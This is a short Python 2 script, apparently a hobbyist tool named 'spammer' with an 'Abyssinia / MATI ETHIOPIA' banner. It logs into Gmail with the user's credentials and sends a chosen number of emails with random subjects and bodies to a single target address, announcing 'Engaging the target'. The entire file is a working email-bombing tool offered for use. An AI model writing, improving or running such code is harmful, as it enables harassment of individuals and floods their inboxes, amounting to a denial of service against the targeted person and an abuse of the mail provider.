# -*- coding: UTF-8 -*-
import smtplib
import datetime
import random
import getpass

class spammer():
    def __init__(self):
        self.banner()
        self.spam()

    def banner(self):
        print """
      ___  _                   _       _       
     / _ \| |                 (_)     (_)      
    / /_\ \ |__  _   _ ___ ___ _ _ __  _  __ _ 
    |  _  | '_ \| | | / __/ __| | '_ \| |/ _` |
    | | | | |_) | |_| \__ \__ \ | | | | | (_| |
    \_| |_/_.__/ \__, |___/___/_|_| |_|_|\__,_|
                __/ |                        
               |___/                         
                                                 MATI ETHIOPIA         
                                                            """

    def spam(self):

        username = raw_input("Enter your gmail: ")
        password = getpass.getpass()
        target = raw_input("Target email: ")
        spams = input("No. of mails to send:  ")

        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        try: server.login(username, password)
        except: print " Authentication Error" ; exit()

        print "Engaging the target"
        try:
            for i in xrange(spams):
                subj = random.randrange(0,999999999999999999)
                content = random.randrange(0,999999999999999999)
                name = random.randrange(0,999999999999999999)
                date = datetime.datetime.now().strftime( "%d/%m/%Y %H:%M" )
                msg = "From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s" % (name, target, subj, date, content)

                server.sendmail(username, target, msg)
        except smtplib.SMTPException:
        		print " An Error Occured During Process"
        		print " The target email might be wrong"
        		exit()
        server.quit()
        print "Target engaging complete"

try:
    spammer()
except KeyboardInterrupt:
    print "\nProgram Interrupted"
    exit()
